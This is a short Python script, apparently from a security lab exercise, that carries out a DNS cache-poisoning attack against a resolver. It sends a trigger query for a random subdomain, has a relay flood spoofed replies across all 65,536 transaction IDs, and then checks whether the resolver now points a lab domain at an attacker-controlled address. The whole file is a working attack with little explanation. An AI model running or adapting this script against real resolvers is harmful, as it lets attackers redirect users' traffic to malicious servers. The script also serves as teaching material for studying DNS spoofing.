#!/usr/bin/env python3
import socket, json, random, string, time, ipaddress
import dns.message, dns.query, dns.rdatatype, dns.rcode
RESOLVER='10.9.0.10'; RELAY='172.16.6.20'; RELAY_PORT=5300; EVIL='10.10.0.200'; ZONE='example.lab10.test.'
BATCH=4096

def query_a(name,timeout=2):
    q=dns.message.make_query(name,'A')
    try: r=dns.query.udp(q,RESOLVER,timeout=timeout)
    except Exception: return []
    out=[]
    for rrset in r.answer:
        if rrset.rdtype==dns.rdatatype.A: out += [str(x) for x in rrset]
    return out

def trigger(name):
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(5)
    q=dns.message.make_query(name,'A'); s.sendto(q.to_wire(),(RESOLVER,53)); return s

def main():
    for ip in [RESOLVER,RELAY,EVIL]: ipaddress.ip_address(ip)
    label='r'+''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(10))
    qname=label+'.'+ZONE
    print('[LAB10] remote mode: no sniffing. Trigger:',qname)
    s=trigger(qname); time.sleep(0.05)
    inj=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    for start in range(0,65536,BATCH):
        msg=json.dumps({'qname':qname,'start':start,'count':BATCH}).encode(); inj.sendto(msg,(RELAY,RELAY_PORT))
    try: data,_=s.recvfrom(4096); print('[LAB10] trigger reply received, bytes=',len(data))
    except Exception: print('[LAB10] trigger reply timed out; continue verification')
    time.sleep(0.2)
    ans=query_a('www.example.lab10.test.',timeout=3)
    print('[VERIFY] www.example.lab10.test A =',ans)
    if EVIL in ans: print('SUCCESS: resolver now follows malicious delegation to attacker DNS')
    else: print('NOT YET: check relay log, resolver mode, firewall and timing')
if __name__=='__main__': main()
